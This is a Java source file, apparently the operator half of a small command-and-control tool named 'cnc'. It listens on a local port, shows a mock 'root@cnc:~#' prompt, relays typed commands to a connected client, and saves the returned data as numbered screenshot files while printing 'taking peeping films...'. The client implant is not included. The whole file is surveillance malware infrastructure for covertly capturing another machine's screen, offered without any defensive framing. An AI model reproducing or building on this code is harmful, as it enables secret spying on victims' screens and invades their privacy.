package cnc;

import java.io.*;
import java.net.*;

public class Server {
    public static void main(String[] args) {
        ServerSocket sSocket = null;
        Socket socket = null;
        PrintWriter writer = null;
        FileOutputStream fos = null;
        InputStream input = null;
        String name;
        try {
            sSocket = new ServerSocket();
            sSocket.bind(new InetSocketAddress("127.0.0.1", 45190));
    
            System.out.println("接続中...");

            socket = sSocket.accept();

            System.out.println("接続完了！\n");

            input = socket.getInputStream();
            writer = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));
            long i = 0;
            for (;; i++) {
                System.out.print("root@cnc:~# ");
                String str = keyboard.readLine();
                writer.println(str);
                if (str.equals("bye")) {
                    break;
                }
                else if (i >= 9223372036854775807L) {
                    i = 0;
                }
                else {
                    System.out.println("taking peeping films...");
                    name = "screenshot" + i + ".png";
                    fos = new FileOutputStream(name);
                    int waitCount = 0;
                    int recvFileSize;
                    byte[] fileBuff = new byte[1024];
                    while(true) {
                        if(input.available() > 0) {
                            recvFileSize = input.read(fileBuff);
                            fos.write(fileBuff, 0 ,recvFileSize);
                        }
                        else {
                            waitCount++;
                            Thread.sleep(100);
                            if (waitCount > 10) break;
                        }
                    }
                    fos.close();
                    System.out.println("completion!");
                }
            }            
        }
        catch(Exception e){
            e.printStackTrace();
        }
        finally {
            try {
                writer.close();
                socket.close();
                sSocket.close();
                System.out.println("サーバー側終了です");
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}